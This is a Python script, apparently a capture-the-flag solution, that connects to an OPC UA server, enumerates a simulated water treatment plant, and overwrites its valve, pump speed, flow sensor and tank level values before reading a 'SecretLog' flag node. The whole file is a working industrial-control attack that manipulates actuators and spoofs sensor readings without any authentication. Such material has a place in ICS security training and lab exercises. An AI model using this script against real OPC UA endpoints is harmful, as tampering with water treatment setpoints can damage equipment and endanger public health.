from opcua import Client
import time

url = "opc.tcp://127.0.0.1:4840"
client = Client(url)
try:
    client.connect()
    plant = client.get_root_node().get_child(["0:Objects", "2:WaterTreatmentPlant"])
    
    nodes = {}
    for node in plant.get_children():
        node_name = node.get_browse_name().Name
        print(f"{node_name}:")
        for child in node.get_children():
            child_name = child.get_browse_name().Name
            try:
                value = child.get_value()
                print(f"  {child_name}: {value}")
                nodes[f"{node_name}/{child_name}"] = child
            except:
                pass
    
    for key, value in [
        ("Valve/PercentOpen", 100.0),
        ("Pump/Speed", 1600.0),
        ("Sensors/FlowRate", 4.0),
        ("Tank/WaterLevel", 5.0)
    ]:
        node = nodes.get(key)
        if node:
            node.set_value(value)
            print(f"[+] Set {key} to {value}")
            time.sleep(3)
    
    flag_node = nodes.get("Maintenance/SecretLog")
    if flag_node:
        print(flag_node.get_value())
        
except Exception:
    pass
finally:
    try:
        client.disconnect()
    except:
        pass